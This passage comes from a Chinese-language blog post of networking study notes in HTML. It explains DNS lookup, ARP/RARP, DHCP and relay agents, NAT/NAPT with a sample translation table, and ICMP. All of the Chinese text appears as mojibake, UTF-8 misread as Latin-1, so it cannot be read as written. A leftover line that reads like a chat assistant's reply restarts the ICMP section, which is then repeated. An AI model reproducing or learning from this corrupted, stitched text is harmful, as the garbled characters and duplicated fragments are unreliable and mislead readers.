æœåŠ¡å™¨æŸ¥è¯¢å…¶æ•°æ®åº“ï¼Œæ‰¾åˆ° <code>www.server.com</code> å¯¹åº”çš„ IP åœ°å€ï¼ˆå¦‚ X.X.X.Xï¼‰ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™æœ¬åœ° DNSã€‚</li></ul></li><li><strong>è¿”å› IP ç»™å®¢æˆ·ç«¯</strong>ï¼š<ul><li>æœ¬åœ° DNS æœåŠ¡å™¨å°† <code>www.server.com</code> çš„ IP åœ°å€è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li><li>å®¢æˆ·ç«¯è·å¾— IP åœ°å€åï¼Œä¾¿å¯ä»¥ç›´æ¥ä¸ç›®æ ‡æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œè®¿é—® <code>www.server.com</code>ã€‚</li></ul></li></ol><p>![image-20241114204317144](F:\new myblog\STUDY\source\img\image-20241114204317144.png)</p><h3 id="ARP-åè®®å·¥ä½œæµç¨‹"><a href="#ARP-åè®®å·¥ä½œæµç¨‹" class="headerlink" title="ARP åè®®å·¥ä½œæµç¨‹"></a>ARP åè®®å·¥ä½œæµç¨‹</h3><p>ARP æ˜¯å€ŸåŠ© ARP è¯·æ±‚ä¸ ARP å“åº”ä¸¤ç§ç±»å‹çš„åŒ…ç¡®å®š MAC åœ°å€çš„</p><ol><li><strong>å‡†å¤‡ IP æ•°æ®åŒ…</strong>ï¼š<ul><li>åœ¨ä¼ è¾“ä¸€ä¸ª IP æ•°æ®åŒ…æ—¶ï¼Œä¸»æœºå·²ç»ç¡®å®šäº†æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€ã€‚</li><li>æ ¹æ®ä¸»æœºçš„è·¯ç”±è¡¨ï¼Œä¸»æœºå¯ä»¥æ‰¾åˆ° IP åŒ…çš„<strong>ä¸‹ä¸€è·³</strong>ï¼Œå³æ•°æ®åŒ…éœ€è¦å‘é€çš„ä¸‹ä¸€ä¸ªè®¾å¤‡çš„ IP åœ°å€ï¼ˆå¯èƒ½æ˜¯ç›®æ ‡è®¾å¤‡ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸­é—´çš„è·¯ç”±å™¨ï¼‰ã€‚</li></ul></li><li><strong>è·å– MAC åœ°å€çš„éœ€æ±‚</strong>ï¼š<ul><li>ç½‘ç»œå±‚è´Ÿè´£å°†æ•°æ®åŒ…ä¼ é€’åˆ°ç›®æ ‡ IP åœ°å€æˆ–ä¸‹ä¸€è·³ IP åœ°å€ã€‚</li><li>ä½†æ˜¯ï¼Œç½‘ç»œå±‚çš„ä¸‹ä¸€å±‚æ˜¯æ•°æ®é“¾è·¯å±‚ï¼Œæ•°æ®é“¾è·¯å±‚éœ€è¦é€šè¿‡ MAC åœ°å€è¿›è¡Œé€šä¿¡ã€‚å› æ­¤ï¼Œä¸»æœºéœ€è¦çŸ¥é“<strong>ä¸‹ä¸€è·³è®¾å¤‡çš„ MAC åœ°å€</strong>ã€‚</li></ul></li><li><strong>ARP è¯·æ±‚</strong>ï¼š<ul><li>å¦‚æœä¸»æœºè¿˜ä¸çŸ¥é“ä¸‹ä¸€è·³çš„ MAC åœ°å€ï¼Œå®ƒä¼šå‘å‡ºä¸€ä¸ª<strong>ARP è¯·æ±‚</strong>ã€‚</li><li>ARP è¯·æ±‚æ˜¯ä¸€ç§<strong>å¹¿æ’­åŒ…</strong>ï¼ŒåŒ…å«è¯·æ±‚æ–¹çš„ IP åœ°å€ã€MAC åœ°å€ï¼Œä»¥åŠç›®æ ‡ IP åœ°å€ï¼ˆéœ€è¦æŸ¥è¯¢çš„ IP åœ°å€ï¼‰ã€‚</li><li>ç”±äºæ˜¯å¹¿æ’­åŒ…ï¼Œç½‘ç»œå†…çš„æ‰€æœ‰è®¾å¤‡éƒ½èƒ½æ”¶åˆ°è¿™ä¸ªè¯·æ±‚åŒ…ã€‚</li></ul></li><li><strong>ARP å“åº”</strong>ï¼š<ul><li>åœ¨ç½‘ç»œä¸­ï¼Œæ¯å°è®¾å¤‡æ”¶åˆ° ARP è¯·æ±‚åï¼Œä¼šæ£€æŸ¥è¯·æ±‚ä¸­çš„ç›®æ ‡ IP åœ°å€æ˜¯å¦ä¸è‡ªèº«çš„ IP åœ°å€åŒ¹é…ã€‚</li><li>å¦‚æœåŒ¹é…ï¼Œç›®æ ‡è®¾å¤‡ä¼š<strong>å›å¤ä¸€ä¸ª ARP å“åº”</strong>ï¼Œåœ¨å“åº”åŒ…ä¸­åŒ…å«è‡ªå·±çš„ MAC åœ°å€ã€‚</li><li>ARP å“åº”æ˜¯<strong>å•æ’­åŒ…</strong>ï¼Œåªå‘å›ç»™è¯·æ±‚æ–¹ã€‚</li></ul></li><li><strong>æ›´æ–° ARP ç¼“å­˜</strong>ï¼š<ul><li>è¯·æ±‚æ–¹ï¼ˆå‘é€ ARP è¯·æ±‚çš„ä¸»æœºï¼‰æ”¶åˆ° ARP å“åº”åï¼Œä¼šæŠŠç›®æ ‡ IP åœ°å€å’Œå¯¹åº”çš„ MAC åœ°å€è®°å½•åˆ°<strong>ARP ç¼“å­˜</strong>ä¸­ã€‚</li><li>ä¸‹æ¬¡å†éœ€è¦å‘é€ç»™åŒä¸€ IP åœ°å€çš„æ•°æ®åŒ…æ—¶ï¼Œä¸»æœºå¯ä»¥ç›´æ¥ä»ç¼“å­˜ä¸­è·å– MAC åœ°å€ï¼Œè€Œä¸éœ€è¦å†æ¬¡å‘é€ ARP è¯·æ±‚ã€‚</li></ul></li><li><strong>å®Œæˆæ•°æ®ä¼ è¾“</strong>ï¼š<ul><li>é€šè¿‡ ARP è·å–åˆ°ç›®æ ‡ MAC åœ°å€åï¼Œä¸»æœºå¯ä»¥åœ¨æ•°æ®åŒ…çš„é“¾è·¯å±‚å¸§å¤´ä¸­æ·»åŠ æ­£ç¡®çš„ MAC åœ°å€ã€‚</li><li>ç„¶åï¼Œæ•°æ®åŒ…å°±å¯ä»¥å‘é€åˆ°ç›®æ ‡è®¾å¤‡ï¼Œå®Œæˆè¿™ä¸€è·³çš„ä¼ è¾“ã€‚</li></ul></li></ol><p>![image-20241114204327513](F:\new myblog\STUDY\source\img\image-20241114204327513.png)</p><p>ä¸»æœºä¼šé€šè¿‡å¹¿æ’­å‘é€ ARP è¯·æ±‚ï¼Œè¿™ä¸ªåŒ…ä¸­åŒ…å«äº†æƒ³è¦çŸ¥é“çš„ MAC åœ°å€çš„ä¸»æœº IP åœ°å€ã€‚</p><p>å½“åŒä¸ªé“¾è·¯ä¸­çš„æ‰€æœ‰è®¾å¤‡æ”¶åˆ° ARP è¯·æ±‚æ—¶ï¼Œä¼šå»æ‹†å¼€ ARP è¯·æ±‚åŒ…é‡Œçš„å†…å®¹ï¼Œå¦‚æœ ARP è¯·æ±‚åŒ…ä¸­çš„ç›®æ ‡ IP åœ°å€ä¸è‡ªå·±çš„ IP åœ°å€ä¸€è‡´ï¼Œé‚£ä¹ˆè¿™ä¸ªè®¾å¤‡å°±å°†è‡ªå·±çš„ MAC åœ°å€å¡å…¥ ARP å“åº”åŒ…è¿”å›ç»™ä¸»æœºã€‚</p><p>æ“ä½œç³»ç»Ÿé€šå¸¸ä¼šæŠŠç¬¬ä¸€æ¬¡é€šè¿‡ ARP è·å–çš„ MAC åœ°å€ç¼“å­˜èµ·æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡ç›´æ¥ä»ç¼“å­˜ä¸­æ‰¾åˆ°å¯¹åº” IP åœ°å€çš„ MAC åœ°å€ã€‚</p><p>ä¸è¿‡ï¼ŒMAC åœ°å€çš„ç¼“å­˜æ˜¯æœ‰ä¸€å®šæœŸé™çš„ï¼Œè¶…è¿‡è¿™ä¸ªæœŸé™ï¼Œç¼“å­˜çš„å†…å®¹å°†è¢«æ¸…é™¤ã€‚</p><p>ARP åè®®æ˜¯å·²çŸ¥ IP åœ°å€æ±‚ MAC åœ°å€ï¼Œé‚£ RARP åè®®æ­£å¥½ç›¸åã€‚å®ƒæ˜¯å·²çŸ¥ MAC åœ°å€æ±‚ IP åœ°å€ã€‚ä¾‹å¦‚å°†æ‰“å°æœºæœåŠ¡å™¨ç­‰å°å‹åµŒå…¥å¼è®¾å¤‡æ¥å…¥åˆ°ç½‘ç»œæ—¶å°±ç»å¸¸ä¼šç”¨å¾—åˆ°ã€‚</p><p>é€šå¸¸è¿™éœ€è¦æ¶è®¾ä¸€å° RARP æœåŠ¡å™¨ï¼Œåœ¨è¿™ä¸ªæœåŠ¡å™¨ä¸Šæ³¨å†Œè®¾å¤‡çš„ MAC åœ°å€åŠå…¶ IP åœ°å€ã€‚ç„¶åå†å°†è¿™ä¸ªè®¾å¤‡æ¥å…¥åˆ°ç½‘ç»œï¼Œæ¥ç€ï¼š</p><p>è¯¥è®¾å¤‡ä¼šå‘é€ä¸€æ¡ã€Œæˆ‘çš„ MAC åœ°å€æ˜¯ XXXXï¼Œè¯·å‘Šè¯‰æˆ‘ï¼Œæˆ‘çš„ IP åœ°å€åº”è¯¥æ˜¯ä»€ä¹ˆã€çš„è¯·æ±‚ä¿¡æ¯ã€‚</p><p>RARP æœåŠ¡å™¨æ¥åˆ°è¿™ä¸ªæ¶ˆæ¯åè¿”å›ã€ŒMAC åœ°å€ä¸º XXXX çš„è®¾å¤‡ï¼ŒIP åœ°å€ä¸º XXXXã€çš„ä¿¡æ¯ç»™è¿™ä¸ªè®¾å¤‡ã€‚</p><p>æœ€åï¼Œè®¾å¤‡å°±æ ¹æ®ä» RARP æœåŠ¡å™¨æ‰€æ”¶åˆ°çš„åº”ç­”ä¿¡æ¯è®¾ç½®è‡ªå·±çš„ IP åœ°å€ã€‚</p><p>![image-20241114204342956](F:\new myblog\STUDY\source\img\image-20241114204342956.png)</p><h3 id="DHCP-åŠ¨æ€è·å–-IP-åœ°å€"><a href="#DHCP-åŠ¨æ€è·å–-IP-åœ°å€" class="headerlink" title="DHCP åŠ¨æ€è·å– IP åœ°å€"></a>DHCP åŠ¨æ€è·å– IP åœ°å€</h3><p>DHCP åœ¨ç”Ÿæ´»ä¸­éå¸¸å¸¸è§ã€‚æˆ‘ä»¬çš„ç”µè„‘é€šå¸¸é€šè¿‡ DHCP åŠ¨æ€è·å– IP åœ°å€ï¼Œè¿™å¤§å¤§ç®€åŒ–äº†æ‰‹åŠ¨é…ç½® IP ä¿¡æ¯çš„è¿‡ç¨‹ã€‚</p><p>![image-20241114204358756](F:\new myblog\STUDY\source\img\image-20241114204358756.png)</p><p>DHCP äº¤äº’çš„ 4 ä¸ªæ­¥éª¤</p><ol><li><strong>DHCP Discoverï¼ˆå‘ç°æŠ¥æ–‡ï¼‰</strong><ul><li>å®¢æˆ·ç«¯é¦–å…ˆå‘èµ· DHCP å‘ç°æŠ¥æ–‡ï¼ˆDHCP DISCOVERï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ª IP æ•°æ®æŠ¥ã€‚</li><li>ç”±äºå®¢æˆ·ç«¯æ²¡æœ‰ IP åœ°å€ï¼Œä¹Ÿä¸çŸ¥é“ DHCP æœåŠ¡å™¨çš„åœ°å€ï¼Œå› æ­¤ä½¿ç”¨ <strong>UDP å¹¿æ’­é€šä¿¡</strong>ã€‚</li><li>å‘ç°æŠ¥æ–‡çš„<strong>ç›®çš„åœ°å€</strong>æ˜¯å¹¿æ’­åœ°å€ <code>255.255.255.255</code>ï¼ˆç«¯å£ 67ï¼‰ï¼Œè€Œ<strong>æº IP åœ°å€</strong>æ˜¯ <code>0.0.0.0</code>ï¼ˆç«¯å£ 68ï¼‰ã€‚</li><li>å®¢æˆ·ç«¯å°†è¯¥æ•°æ®æŠ¥ä¼ é€’ç»™é“¾è·¯å±‚ï¼Œé“¾è·¯å±‚å†å°†å…¶å¹¿æ’­åˆ°æ‰€æœ‰ç½‘ç»œè®¾å¤‡ã€‚</li></ul></li><li><strong>DHCP Offerï¼ˆæä¾›æŠ¥æ–‡ï¼‰</strong><ul><li>DHCP æœåŠ¡å™¨æ”¶åˆ°å‘ç°æŠ¥æ–‡åï¼Œä¼šç”¨ DHCP æä¾›æŠ¥æ–‡ï¼ˆDHCP OFFERï¼‰å‘å®¢æˆ·ç«¯å“åº”ã€‚</li><li>æä¾›æŠ¥æ–‡ä¾ç„¶ä½¿ç”¨å¹¿æ’­åœ°å€ <code>255.255.255.255</code>ã€‚</li><li>æŠ¥æ–‡ä¸­åŒ…å«äº†æœåŠ¡å™¨æä¾›çš„å¯ç§Ÿç”¨ IP åœ°å€ã€å­ç½‘æ©ç ã€é»˜è®¤ç½‘å…³ã€DNS æœåŠ¡å™¨ä»¥åŠ IP åœ°å€çš„ç§Ÿç”¨æœŸç­‰é…ç½®ä¿¡æ¯ã€‚</li></ul></li><li><strong>DHCP Requestï¼ˆè¯·æ±‚æŠ¥æ–‡ï¼‰</strong><ul><li>å®¢æˆ·ç«¯æ”¶åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡å™¨çš„ DHCP æä¾›æŠ¥æ–‡åï¼Œä»ä¸­é€‰æ‹©ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¹¶å‘é€‰å®šçš„æœåŠ¡å™¨å‘é€ DHCP è¯·æ±‚æŠ¥æ–‡ï¼ˆDHCP REQUESTï¼‰ã€‚</li><li>è¯¥è¯·æ±‚æŠ¥æ–‡å›æ˜¾äº†æœåŠ¡å™¨æä¾›çš„å‚æ•°ã€‚</li></ul></li><li><strong>DHCP ACKï¼ˆç¡®è®¤æŠ¥æ–‡ï¼‰</strong><ul><li>æœåŠ¡å™¨æ”¶åˆ° DHCP è¯·æ±‚æŠ¥æ–‡åï¼Œä½¿ç”¨ DHCP ACK æŠ¥æ–‡è¿›è¡Œå“åº”ï¼Œç¡®è®¤æ‰€è¯·æ±‚çš„å‚æ•°ã€‚</li><li>ä¸€æ—¦å®¢æˆ·ç«¯æ”¶åˆ° DHCP ACK æŠ¥æ–‡ï¼Œæ•´ä¸ªäº¤äº’è¿‡ç¨‹ä¾¿å®Œæˆï¼Œå®¢æˆ·ç«¯å³å¯åœ¨ç§Ÿç”¨æœŸå†…ä½¿ç”¨æœåŠ¡å™¨åˆ†é…çš„ IP åœ°å€ã€‚</li></ul></li></ol><p>ç§Ÿçº¦ç»­çº¦è¿‡ç¨‹</p><ul><li><p>ç§ŸæœŸå¿«åˆ°æœŸæ—¶</p><p>å®¢æˆ·ç«¯ä¼šå‘æœåŠ¡å™¨å‘é€ DHCP è¯·æ±‚æŠ¥æ–‡ã€‚</p><ul><li>å¦‚æœæœåŠ¡å™¨åŒæ„ç»­çº¦ï¼Œä¼šç”¨ DHCP ACK æŠ¥æ–‡åº”ç­”ï¼Œå®¢æˆ·ç«¯å³å¯å»¶é•¿ç§ŸæœŸã€‚</li><li>å¦‚æœæœåŠ¡å™¨ä¸åŒæ„ç»­çº¦ï¼Œåˆ™ä¼šç”¨ DHCP NACK æŠ¥æ–‡åº”ç­”ï¼Œå®¢æˆ·ç«¯å¿…é¡»åœæ­¢ä½¿ç”¨å½“å‰ IP åœ°å€ã€‚</li></ul></li></ul><p>ç”±äº DHCP äº¤äº’å…¨ç¨‹ä½¿ç”¨<strong>UDP å¹¿æ’­</strong>é€šä¿¡ï¼Œå¦‚æœ DHCP æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¸åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œè€Œè·¯ç”±å™¨ä¸ä¼šè½¬å‘å¹¿æ’­åŒ…ï¼Œé‚£ä¹ˆæ¯ä¸ªç½‘ç»œéƒ½éœ€è¦ä¸€ä¸ª DHCP æœåŠ¡å™¨ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå‡ºç°äº†<strong>DHCP ä¸­ç»§ä»£ç†</strong>ã€‚æœ‰äº† DHCP ä¸­ç»§ä»£ç†ï¼Œä¸åŒç½‘æ®µçš„ IP åœ°å€åˆ†é…ä¹Ÿå¯ä»¥ç”±ä¸€ä¸ª DHCP æœåŠ¡å™¨ç»Ÿä¸€ç®¡ç†ï¼Œç®€åŒ–äº†ç½‘ç»œç®¡ç†ã€‚</p><p>![image-20241114204414199](F:\new myblog\STUDY\source\img\image-20241114204414199.png)</p><p>DHCP ä¸­ç»§ä»£ç†çš„å·¥ä½œæµç¨‹</p><ol><li><strong>DHCP å®¢æˆ·ç«¯å‘ä¸­ç»§ä»£ç†å‘é€è¯·æ±‚</strong><ul><li>DHCP å®¢æˆ·ç«¯ä¼šå°† DHCP è¯·æ±‚åŒ…å‘é€ç»™<strong>DHCP ä¸­ç»§ä»£ç†</strong>ã€‚</li><li>DHCP ä¸­ç»§ä»£ç†æ”¶åˆ°å®¢æˆ·ç«¯çš„å¹¿æ’­è¯·æ±‚åŒ…åï¼Œå°†å…¶è½¬å‘ç»™ DHCP æœåŠ¡å™¨ï¼Œä½†è¿™æ¬¡æ˜¯ä»¥<strong>å•æ’­</strong>çš„å½¢å¼å‘å‡ºã€‚</li></ul></li><li><strong>DHCP æœåŠ¡å™¨å“åº”ä¸­ç»§ä»£ç†</strong><ul><li>DHCP æœåŠ¡å™¨æ”¶åˆ°ä¸­ç»§ä»£ç†è½¬å‘çš„è¯·æ±‚åŒ…åï¼Œè¿”å›ä¸€ä¸ªåº”ç­”åŒ…ç»™ä¸­ç»§ä»£ç†ã€‚</li><li>è¿™ä¸ªåº”ç­”åŒ…åŒ…å«äº†åˆ†é…ç»™å®¢æˆ·ç«¯çš„ IP åœ°å€å’Œå…¶ä»–ç½‘ç»œé…ç½®ä¿¡æ¯ã€‚</li></ul></li><li><strong>ä¸­ç»§ä»£ç†è½¬å‘åº”ç­”ç»™å®¢æˆ·ç«¯</strong><ul><li>DHCP ä¸­ç»§ä»£ç†æ”¶åˆ°æœåŠ¡å™¨çš„åº”ç­”åŒ…åï¼Œå†å°†è¯¥åŒ…è½¬å‘ç»™ DHCP å®¢æˆ·ç«¯ã€‚</li></ul></li></ol><h3 id="NAT-ç½‘ç»œåœ°å€è½¬æ¢"><a href="#NAT-ç½‘ç»œåœ°å€è½¬æ¢" class="headerlink" title="NAT ç½‘ç»œåœ°å€è½¬æ¢"></a>NAT ç½‘ç»œåœ°å€è½¬æ¢</h3><p>Pv4 åœ°å€èµ„æºéå¸¸ç´§ç¼ºï¼Œå°½ç®¡é€šè¿‡æ— åˆ†ç±»åœ°å€ï¼ˆCIDRï¼‰å¯ä»¥å‡ç¼“ IPv4 åœ°å€çš„è€—å°½é€Ÿåº¦ï¼Œä½†éšç€äº’è”ç½‘ç”¨æˆ·çš„å¿«é€Ÿå¢é•¿ï¼ŒIPv4 åœ°å€ä¾ç„¶é¢ä¸´è€—å°½çš„é£é™©ã€‚</p><p>äºæ˜¯ï¼Œæå‡ºäº†ä¸€ç§<strong>ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰</strong>çš„æ–¹æ³•ï¼Œå†æ¬¡ç¼“è§£äº† IPv4 åœ°å€è€—å°½çš„é—®é¢˜ã€‚</p><p>ç®€å•æ¥è¯´ï¼Œ<strong>NAT</strong> æ˜¯åœ¨åŒä¸€å…¬å¸ã€å®¶åº­æˆ–æ•™å®¤å†…çš„ä¸»æœºå¯¹å¤–é€šä¿¡æ—¶ï¼Œå°†<strong>ç§æœ‰ IP åœ°å€</strong>è½¬æ¢æˆ<strong>å…¬æœ‰ IP åœ°å€</strong>ã€‚è¿™ç§è½¬æ¢ä½¿å¾—å¤šä¸ªå†…ç½‘è®¾å¤‡å¯ä»¥å…±äº«ä¸€ä¸ªå…¬æœ‰ IP åœ°å€ï¼Œä»è€Œå‡å°‘å…¬æœ‰ IP çš„éœ€æ±‚ã€‚</p><p>ç„¶è€Œï¼Œæ™®é€šçš„ NAT è½¬æ¢è™½ç„¶å¯ä»¥èŠ‚çœ IP åœ°å€ï¼Œä½†åœ¨å¤§é‡è®¾å¤‡è®¿é—®äº’è”ç½‘çš„æƒ…å†µä¸‹ä¾ç„¶ä¸å¤Ÿç”¨ã€‚</p><p>![image-20241114204426532](F:\new myblog\STUDY\source\img\image-20241114204426532.png)</p><p>![image-20241114204439369](F:\new myblog\STUDY\source\img\image-20241114204439369.png)</p><h3 id="NAPT-è·¯ç”±å™¨çš„è½¬æ¢"><a href="#NAPT-è·¯ç”±å™¨çš„è½¬æ¢" class="headerlink" title="NAPT è·¯ç”±å™¨çš„è½¬æ¢"></a>NAPT è·¯ç”±å™¨çš„è½¬æ¢</h3><p>åœ¨ç½‘ç»œåœ°å€å’Œç«¯å£è½¬æ¢ï¼ˆNAPTï¼‰ä¸­ï¼Œå¤šä¸ªç§æœ‰ IP åœ°å€çš„å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡åŒä¸€ä¸ªå…¬æœ‰ IP åœ°å€è®¿é—®åŒä¸€å°æœåŠ¡å™¨ï¼ŒNAPT ä½¿ç”¨<strong>ç«¯å£å·</strong>æ¥åŒºåˆ†æ¯ä¸ªè¿æ¥ã€‚</p><p>ç¤ºä¾‹åœºæ™¯</p><ul><li>ä¸¤ä¸ªå®¢æˆ·ç«¯ï¼š<strong>192.168.1.10</strong> å’Œ <strong>192.168.1.11</strong>ï¼Œå®ƒä»¬éƒ½åœ¨ä¸æœåŠ¡å™¨ <strong>183.232.231.172</strong> è¿›è¡Œé€šä¿¡ã€‚</li><li>æœ¬åœ°ç«¯å£ï¼šè¿™ä¸¤ä¸ªå®¢æˆ·ç«¯çš„æœ¬åœ°ç«¯å£å·éƒ½æ˜¯ <strong>1025</strong>ã€‚</li><li>å…¬æœ‰ IP åœ°å€ï¼šNAPT è·¯ç”±å™¨ä¸ºä¸¤ä¸ªå®¢æˆ·ç«¯æä¾›ä¸€ä¸ª<strong>ç›¸åŒçš„å…¬æœ‰ IP åœ°å€</strong>ï¼Œå¦‚ <strong>120.229.175.121</strong>ï¼Œå¹¶é€šè¿‡ä¸åŒçš„ç«¯å£å·æ¥åŒºåˆ†è¿æ¥ã€‚</li></ul><p>NAPT è½¬æ¢è¡¨</p><p>NAPT è·¯ç”±å™¨ä¼šä¸ºæ¯ä¸ªè¿æ¥ç”Ÿæˆä¸€ä¸ªè½¬æ¢è¡¨ï¼Œç”¨äºæ­£ç¡®åœ°è½¬æ¢ IP åœ°å€å’Œç«¯å£å·çš„ç»„åˆï¼Œä»¥ç¡®ä¿ä¸åŒçš„å®¢æˆ·ç«¯èƒ½å¤ŸåŒæ—¶ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚<br>è½¬æ¢è¡¨çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><table><thead><tr><th>å†…éƒ¨ IP åœ°å€</th><th>å†…éƒ¨ç«¯å£</th><th>å…¬æœ‰ IP åœ°å€</th><th>å…¬æœ‰ç«¯å£</th></tr></thead><tbody><tr><td>192.168.1.10</td><td>1025</td><td>120.229.175.121</td><td>30001</td></tr><tr><td>192.168.1.11</td><td>1025</td><td>120.229.175.121</td><td>30002</td></tr></tbody></table><ul><li><strong>å®¢æˆ·ç«¯ A</strong>ï¼ˆ192.168.1.10:1025ï¼‰ä¼šè¢«è½¬æ¢ä¸º <strong>120.229.175.121:30001</strong>ã€‚</li><li><strong>å®¢æˆ·ç«¯ B</strong>ï¼ˆ192.168.1.11:1025ï¼‰ä¼šè¢«è½¬æ¢ä¸º <strong>120.229.175.121:30002</strong>ã€‚</li></ul><p>è½¬æ¢è¡¨çš„ç”Ÿæˆä¸åˆ é™¤</p><ul><li>NAPT è½¬æ¢è¡¨åœ¨<strong>å»ºç«‹è¿æ¥æ—¶ç”Ÿæˆ</strong>ï¼Œä¾‹å¦‚åœ¨ TCP è¿æ¥é¦–æ¬¡æ¡æ‰‹æ—¶ï¼ŒSYN åŒ…å‘å‡ºåå°±ä¼šç”Ÿæˆè¡¨é¡¹ã€‚</li><li>åœ¨è¿æ¥å…³é—­æ—¶ï¼ˆä¾‹å¦‚ TCP çš„ FIN åŒ…ç¡®è®¤åº”ç­”ï¼‰ï¼Œå¯¹åº”çš„è½¬æ¢è¡¨é¡¹ä¼šè¢«åˆ é™¤ï¼Œä»è€Œé‡Šæ”¾èµ„æºã€‚</li></ul><p>ICMP äº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®</p><p>åœ¨å¤æ‚çš„ç½‘ç»œä¼ è¾“ç¯å¢ƒä¸­ï¼Œç½‘ç»œåŒ…ä¼ è¾“å¸¸å¸¸é‡åˆ°å„ç§é—®é¢˜ã€‚å½“é—®é¢˜å‘ç”Ÿæ—¶ï¼Œè®¡ç®—æœºç½‘ç»œéœ€è¦â€œå‘ŠçŸ¥â€å‘é€æ–¹ï¼Œä»¥ä¾¿åŠæ—¶è°ƒæ•´ä¼ è¾“ç­–ç•¥ï¼Œä»è€Œ<strong>æ§åˆ¶æ•´ä¸ªç½‘ç»œçš„ç¨³å®šæ€§å’Œå¯é æ€§</strong></p><p><strong>ICMPï¼ˆäº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰</strong>ä¸»è¦ç”¨äºæŠ¥å‘Šç½‘ç»œä¼ è¾“ä¸­çš„é—®é¢˜å¹¶æä¾›è¯Šæ–­ä¿¡æ¯ï¼Œå…·ä½“åŠŸèƒ½åŒ…æ‹¬ï¼š</p><ul><li><strong>ç¡®è®¤ IP åŒ…æ˜¯å¦æˆåŠŸé€è¾¾ç›®æ ‡åœ°å€</strong></li><li><strong>æŠ¥å‘Š IP åŒ…åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«ä¸¢å¼ƒçš„åŸå› </strong></li><li><strong>å¸®åŠ©ä¼˜åŒ–å’Œæ”¹å–„ç½‘ç»œè®¾ç½®</strong></li></ul><p>![image-20241114204450318](F:\new myblog\STUDY\source\img\image-20241114204450318.png)</p><p>åœ¨ IP é€šä¿¡ä¸­ï¼Œå¦‚æœæŸä¸ª IP åŒ…æœªèƒ½æˆåŠŸåˆ°è¾¾ç›®æ ‡åœ°å€ï¼ŒICMP è´Ÿè´£é€šçŸ¥å‘é€æ–¹å¹¶æä¾›å…·ä½“çš„å¤±è´¥åŸå› ã€‚ä¾‹å¦‚ï¼š</p><ol><li><strong>é€šçŸ¥è¿‡ç¨‹</strong>ï¼š<ul><li>ä¸»æœº A å‘ä¸»æœº B å‘é€æ•°æ®åŒ…ï¼Œä½†ç”±äºæŸç§åŸå› ï¼Œé€”ä¸­çš„<strong>è·¯ç”±å™¨ 2</strong>æœªèƒ½æ‰¾åˆ°ä¸»æœº Bã€‚</li><li>è·¯ç”±å™¨ 2 ä¼šå‘ä¸»æœº A å‘é€ä¸€ä¸ª <strong>ICMP ç›®æ ‡ä¸å¯è¾¾</strong>æ¶ˆæ¯ï¼Œå‘ŠçŸ¥ä¸»æœº A ç›®æ ‡ä¸»æœº B æ— æ³•åˆ°è¾¾ã€‚</li></ul></li><li><strong>æ¶ˆæ¯ä¼ é€’</strong>ï¼š<ul><li>ICMP æ¶ˆæ¯é€šè¿‡ IP åè®®å‘é€ï¼ŒæŒ‰ç…§æ­£å¸¸çš„è·¯ç”±è½¬å‘è¿‡ç¨‹è¿”å›ç»™å‘é€æ–¹ã€‚</li><li>è·¯ç”±å™¨ 2 å‘é€çš„ ICMP æ¶ˆæ¯ä¼šå…ˆç»è¿‡<strong>è·¯ç”±å™¨ 1</strong>ï¼Œå†è½¬å‘ç»™ä¸»æœº Aã€‚</li></ul></li><li><strong>è§£æ ICMP æ¶ˆæ¯</strong>ï¼š<ul><li>ä¸»æœº A æ¥æ”¶åˆ° ICMP æ¶ˆæ¯åï¼Œè§£ææ¶ˆæ¯çš„é¦–éƒ¨å’Œæ•°æ®åŸŸï¼Œå¾—çŸ¥å…·ä½“çš„é—®é¢˜åŸå› ã€‚</li></ul></li></ol><p>æ‚¨æåˆ°çš„ ICMP çš„ â€œæ§åˆ¶â€ åŠŸèƒ½éå¸¸å…³é”®ï¼Œä»¥ä¸‹æ˜¯ç›¸å…³å†…å®¹çš„æ•´ç†ç‰ˆæœ¬ï¼š</p><hr><h3 id="ICMPï¼šç½‘ç»œæ§åˆ¶å’Œè¯Šæ–­åè®®"><a href="#ICMPï¼šç½‘ç»œæ§åˆ¶å’Œè¯Šæ–­åè®®" class="headerlink" title="ICMPï¼šç½‘ç»œæ§åˆ¶å’Œè¯Šæ–­åè®®"></a>ICMPï¼šç½‘ç»œæ§åˆ¶å’Œè¯Šæ–­åè®®</h3><p>åœ¨å¤æ‚çš„ç½‘ç»œä¼ è¾“ç¯å¢ƒä¸­ï¼Œç½‘ç»œåŒ…ä¼ è¾“å¸¸å¸¸é‡åˆ°å„ç§é—®é¢˜ã€‚å½“é—®é¢˜å‘ç”Ÿæ—¶ï¼Œè®¡ç®—æœºç½‘ç»œéœ€è¦â€œå‘ŠçŸ¥â€å‘é€æ–¹ï¼Œä»¥ä¾¿åŠæ—¶è°ƒæ•´ä¼ è¾“ç­–ç•¥ï¼Œä»è€Œ<strong>æ§åˆ¶æ•´ä¸ªç½‘ç»œçš„ç¨³å®šæ€§å’Œå¯é æ€§</strong>ã€‚</p><hr><p>ICMP çš„ä¸»è¦åŠŸèƒ½</p><p><strong>ICMPï¼ˆäº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰</strong>ä¸»è¦ç”¨äºæŠ¥å‘Šç½‘ç»œä¼ è¾“ä¸­çš„é—®é¢˜å¹¶æä¾›è¯Šæ–­ä¿¡æ¯ï¼Œå…·ä½“åŠŸèƒ½åŒ…æ‹¬ï¼š</p><ul><li><strong>ç¡®è®¤ IP åŒ…æ˜¯å¦æˆåŠŸé€è¾¾ç›®æ ‡åœ°å€</strong></li><li><strong>æŠ¥å‘Š IP åŒ…åœ¨ä¼ 